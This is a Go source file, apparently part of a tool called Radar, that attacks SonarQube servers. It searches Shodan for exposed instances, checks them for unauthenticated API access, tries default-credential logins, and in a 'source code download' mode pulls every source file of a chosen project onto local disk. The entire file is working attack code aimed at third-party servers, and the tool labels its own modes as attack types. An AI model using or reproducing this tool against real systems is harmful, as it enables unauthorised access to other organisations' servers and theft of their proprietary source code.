package sonarqube

import (
	"flag"
	"fmt"
	"strings"

	"html"
	"regexp"

	"net"
	"sync"

	"encoding/json"
	"strconv"

	"radar/internal/log"
	"radar/internal/network"
	"radar/internal/shodan"
	"radar/internal/utils"
)

// Parse user supplied parameter and create a sonarqube scanner
func NewScanner() *Scanner {
	scanner := &Scanner{}

	menu := flag.NewFlagSet("sonarqube", flag.ExitOnError)

	menu.StringVar(&scanner.AttackType, "aT", "scan", "attack type: scan | scd (source code download)")
	menu.StringVar(&scanner.ShodanApiKey, "aK", "", "shodan api key (Required when attacktype scan)")
	menu.IntVar(&scanner.Port, "p", 9000, "sonarqube port (Required when attacktype scd)")
	menu.StringVar(&scanner.Hostname, "host", "", "sonarqube hostname or Ip (Required when attacktype scd)")
	menu.StringVar(&scanner.ProjectKey, "pK", "", "project key that want to download source code (Required when attacktype scd)")

	scanner.Menu = menu

	return scanner
}

// Find sonarqube instance on shodan
// Detect misconfigured sonarqubes and show details
func (sonarqube Scanner) Scan() {
	var wg sync.WaitGroup

	if sonarqube.ShodanApiKey == "" {
		log.ValidationError("Shodan Api Key is required for SonarQube attacks")
		return
	}

	searchResult, err := shodan.Search(sonarqube.ShodanApiKey, "sonarqube")
	if err != nil {
		log.Error("An error occured while during shodan search", err)
		return
	}

	for _, result := range searchResult.Matches {
		connection, err := network.HostConnection(result.Ip, result.Port)

		if err != nil {
			log.Error("Sonarqube.Scan ::: ", err)
			break
		}

		go func(r shodan.Match, c net.Conn) {
			defer c.Close()
			wg.Add(2)
			checkSonarQubeDetail(r, &wg)
			checkDefaultCredential(r, &wg)
		}(result, connection)
	}

	wg.Wait()
}

func (sonarqube Scanner) Scd() {
	var wg sync.WaitGroup
	components := getSonarQubeProjectFiles(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, 1, 500)

	if components == nil {
		log.Warning("Could not found any code folder!")
		return
	}

	for i, fileComponent := range components {
		if utils.Contains(fileComponent.Name, utils.CommonFileExtensions()) {
			go func(file Component) {
				wg.Add(1)
				createSourceCodeFileViaSonarQube(sonarqube.Hostname, sonarqube.Port, sonarqube.ProjectKey, file, &wg)
			}(fileComponent)
		}

		if i%5 == 0 {
			wg.Wait()
		}
	}

	wg.Wait()
}

func createSourceCodeFileViaSonarQube(hostname string, port int, projectKey string, file Component, wg *sync.WaitGroup) {
	defer wg.Done()

	path := strings.Split(file.Path, file.Name)[0]

	err := utils.CreateFolder("scd/" + projectKey + "/" + path)
	if err != nil {
		return
	}

	f, err := utils.CreateFile("scd/" + projectKey + "/" + file.Path)
	if err != nil {
		return
	}

	log.Warning(file.Key + " downloading")
	codeArray := getSonarQubeProjectCodes(hostname, port, file.Key)

	if codeArray == nil {
		log.Error(file.Key+" was not downloaded", err)
		return
	}

	_, err = f.WriteString("//This code fetched by Radar")
	if err != nil {
		log.Error("An error occured when writing file"+file.Key, err)
	}

	for _, line := range codeArray.Sources {
		c := clearHtmlTagFromSonarQubeCodeFile(line.Code)

		_, err = f.WriteString("\n" + c)
		if err != nil {
			log.Error("An error occured when writing file"+file.Key, err)
		}
	}

	err = f.Close()
	if err != nil {
		log.Error("An error occured when closed"+file.Key, err)
	}
}

// Get details on detected SonarQube
// Like issue, vulnerability, code smell counts, etc.
func checkSonarQubeDetail(searchResult shodan.Match, wg *sync.WaitGroup) {
	defer wg.Done()

	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_USER_CURRENT), "")
	if err != nil {
		log.Error("sonarqube.checkSonarQubeDetail ::: ", err)
		return
	}

	_, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		log.Error("sonarqube.checkSonarQubeDetail ::: ", err)
		return
	}

	if statusCode == 401 || statusCode == 403 {
		log.Fail(fmt.Sprintf("SonarQube Projects Not Accessible - %s:%d", searchResult.Ip, searchResult.Port))
		return
	} else if statusCode != 200 {
		log.Fail(fmt.Sprintf("SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port))
		return
	}

	projectCount := getProjectCount(searchResult)

	if projectCount > 0 {
		codeSmell, vulnerability, bug, securityHotspot := getProjectIssuesCount(searchResult)
		log.Success(fmt.Sprintf(
			"SonarQube Projects Accessible! - %s:%d\n[*******] Project Counts: %d, Code Smell: %d, Vulnerability: %d, Bug: %d, Security Hotspot: %d",
			searchResult.Ip, searchResult.Port, projectCount, codeSmell, vulnerability, bug, securityHotspot))
	} else {
		log.Success(fmt.Sprintf("SonarQube Projects Accessible But Empty - %s:%d", searchResult.Ip, searchResult.Port))
	}
}

func checkDefaultCredential(searchResult shodan.Match, wg *sync.WaitGroup) {
	defer wg.Done()

	req, err := network.PrepareRequest(network.PostRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_AUTHENTICATION_LOGIN), fmt.Sprintf("login=%s&password=%s", DEFAULT_USER, DEFAULT_PASSWORD))
	if err != nil {
		log.Error("", err)
		return
	}

	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")

	_, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		log.Error("", err)
		return
	}

	if statusCode == 200 {
		log.Success(fmt.Sprintf("Default Credential Work - %s:%d", searchResult.Ip, searchResult.Port))
	} else {
		log.Fail(fmt.Sprintf("Default Credential Not Work - %s:%d", searchResult.Ip, searchResult.Port))
	}
}

func getProjectCount(searchResult shodan.Match) int {
	result := SearchProject{}

	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_COMPONENTS_SEARCH_PROJECTS), "")
	if err != nil {
		log.Error("sonarqube.getProjectCount ::: ", err)
		return 0
	}

	body, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		log.Error("sonarqube.getProjectCount ::: ", err)
		return 0
	}

	if statusCode != 200 {
		log.Error(fmt.Sprintf("sonarqube.getProjectCount ::: SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port), nil)
		return 0
	}

	err = json.Unmarshal([]byte(body), &result)
	if err != nil {
		log.Error("sonarqube.getProjectCount ::: An error occured when deserialize object", err)
		return 0
	}

	return result.Paging.Total
}

func getProjectIssuesCount(searchResult shodan.Match) (int, int, int, int) {
	result := Issues{}
	codeSmell, vulnerability, bug, securityHotspot := 0, 0, 0, 0

	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, searchResult.Ip, searchResult.Port, API_ISSUE_SEARCH), "")
	if err != nil {
		log.Error("sonarqube.getProjectIssuesCount ::: ", err)
		return 0, 0, 0, 0
	}

	body, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		log.Error("sonarqube.getProjectIssuesCount ::: ", err)
		return 0, 0, 0, 0
	}

	if statusCode != 200 {
		log.Error(fmt.Sprintf("sonarqube.getProjectIssuesCount ::: SonarQube Return %d Status Code - %s:%d", statusCode, searchResult.Ip, searchResult.Port), nil)
		return 0, 0, 0, 0
	}

	err = json.Unmarshal([]byte(body), &result)
	if err != nil {
		log.Error("sonarqube.getProjectIssuesCount ::: An error occured when deserialize object", err)
		return 0, 0, 0, 0
	}

	if result.Facets != nil {
		for _, data := range result.Facets[0].Values {
			switch data.Val {
			case "CODE_SMELL":
				codeSmell = data.Count
			case "VULNERABILITY":
				vulnerability = data.Count
			case "BUG":
				bug = data.Count
			case "SECURITY_HOTSPOT":
				securityHotspot = data.Count
			}
		}
	}

	return codeSmell, vulnerability, bug, securityHotspot
}

func getSonarQubeProjectFiles(hostname string, port int, projectKey string, page int, count int) []Component {
	result := &ComponentTree{}

	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, hostname, port, PROJECT_COMPONENT_PATH+fmt.Sprintf(PROJECT_COMPONENT_PARAM, projectKey, page, count)), "")
	if err != nil {
		return nil
	}

	body, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		return nil
	}

	if statusCode != 200 {
		log.Error("Server return error code "+strconv.Itoa(statusCode)+" when fetching code folder", err)
		return nil
	}

	err = json.Unmarshal([]byte(body), &result)
	if err != nil {
		log.Error("An error occured when deserialize object", err)
		return nil
	}

	if float64(result.Paging.Total)/float64(count) > float64(page) {
		result.Components = append(result.Components, getSonarQubeProjectFiles(hostname, port, projectKey, page+1, count)...)
	}

	return result.Components
}

func getSonarQubeProjectCodes(hostname string, port int, projectKey string) *Line {
	result := &Line{}

	req, err := network.PrepareRequest(network.GetRequest, fmt.Sprintf(BASE_URL, hostname, port, fmt.Sprintf(PROJECT_SOURCE_CODE_PATH, projectKey)), "")
	if err != nil {
		return nil
	}

	body, statusCode, _, err := network.SendRequest(req)
	if err != nil {
		return nil
	}

	if statusCode != 200 {
		log.Error("Server return error code "+strconv.Itoa(statusCode), err)
		return nil
	}

	err = json.Unmarshal([]byte(body), &result)
	if err != nil {
		log.Error("An error occured when deserialize object", err)
		return nil
	}

	return result
}

func clearHtmlTagFromSonarQubeCodeFile(code string) string {
	regex := regexp.MustCompile(`<.*?>`)
	c := regex.ReplaceAllString(code, "")
	c = html.UnescapeString(c)

	return c
}
